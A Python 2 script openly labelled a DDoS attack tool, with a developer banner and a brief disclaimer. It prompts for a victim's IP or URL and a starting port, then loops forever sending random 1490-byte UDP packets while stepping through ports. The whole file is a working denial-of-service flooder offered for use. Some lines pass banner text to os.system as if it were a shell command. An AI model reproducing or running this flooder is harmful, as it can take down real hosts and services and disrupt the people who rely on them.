import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("RoboDDoS Attack Tool")
print
print "+--------------------------------------------+"
print "|    Developer:     |    C3lt1c Viking       |"
print "+-------------------+------------------------+"
print "|    Website:       | www.c3lt1cviking.com   |"
print "+-------------------+------------------------+"
print "|    Twitter:       |      @C3lt1cViking     |"
print "+-------------------+------------------------+"
print "|    GitHub:        |github.com/C3lt1c-Viking|"
print "+--------------------+-----------------------+"
print "                                              "
print "                                              "
print "**********************************************"
print "** DISCLAIMER:                               *"
print "*The usage of this program is upon your own! *"
print "*The developer is in no way responsible for  *"
print "*Your actions! Be kind and respectful!       *"
print "**********************************************"

print
ip = raw_input("Victims IP/URL: ")
port = input("Open Port: ")

os.system("clear")
os.system("Initiating RoboDDoS Attack Sequence:")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s on port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
